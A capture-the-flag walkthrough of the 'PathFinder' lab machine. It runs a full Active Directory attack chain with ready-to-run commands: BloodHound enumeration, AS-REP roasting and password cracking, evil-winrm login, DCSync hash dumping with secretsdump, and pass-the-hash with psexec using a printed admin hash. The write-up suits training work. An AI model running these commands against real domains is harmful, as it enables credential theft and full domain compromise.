# PathFinder

## Never get in a routine!  

Basically I did a nmap, buuut nothing appeared !  
So let's test all the port from like 1 to 60000, this can be pretty long !!  
Be sure that you're scanning on tun0 (this is the interface to interact with the VPN)

I personnaly can't see any familiar port so i refer to [This Guide](https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers) !  
And the 88 is Kerberos !!  Remember it from last box ? We got a password for it! good news !!  
We also notice the presence of the Windows Remote Port at 5985
We Can maybe Try a new tool to understand the underlaying structure !!  

## Some Visualization (out of my terminal for once !)

Let's use [BloodHound](https://github.com/BloodHoundAD/BloodHound) and the [BloodHound.PY](https://github.com/fox-it/BloodHound.py) to fetch the data.  
This tool create a visual representation of a underlaying network, so it'll be useful for us (good luck with the installation)  

So once all's done let's fetch the data with BloodHound.PY:  `bloodhound-python -d megacorp.local -u sandra -p "Password1234!" -gc pathfinder.megacorp.local -c all -ns 10.10.10.30`  

You'll have to start neo4j with **systemctl start neo4j**

It brought us some json file, Once done let's just start BloodHound and drag the json file in BloodHound, On the top select query and play around to find an interesting pov. (In particular Find Principals with DSync Rights)

We see that the user svc_bes has GetChangesAll access to the MEGACORP main.  
We'll now check if the pre-auth is activated or not with an [impacket](https://github.com/SecureAuthCorp/impacket) tool -> GetNPUsers!  

```sh
GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30 > ticket
```

*(Remove the impacket signature before hash break)*
After that we get the hash of the message so let's break it with john the ripper once again with the rockyou dictionary !  

`john ticket -wordlist=/usr/share/wordlists/rockyou.txt`

And John return us "Sheffield19" as a password !
And as we noticied at the very beginning, the port for Windows Remote is open, we'll try to enter as svc_best this way!  
And we will us [evil-winrm](https://github.com/Hackplayers/evil-winrm).

`evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19`
And on his desktop we can find "user.txt" !! Well down lol the code is **CENSORED**  

## Final Escalation  

Now we do want to escalate to become root, because we have the right "GetChangesAll" from svc_bes, we can use it to create a request and get all the data.  
We will need to dump hashes again so we'll use impacket once again witht the secretsdump script.  

`secretsdump.py -dc-ip 10.10.10.30 megacorp.local/svc_bes:Sheffield19@10.10.10.30`  

And saving this file we can see that we have hashes to a lot of different profile and we have the Administrator hash, so let's grab the admin hash and get a tty with impackets once again !  

`psexec.py megacorp.local/administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18`  

We got now a cmd, let's do whoami we are "authority/system"
Now it's time to get the root.txt and the code is **CENSORED**  
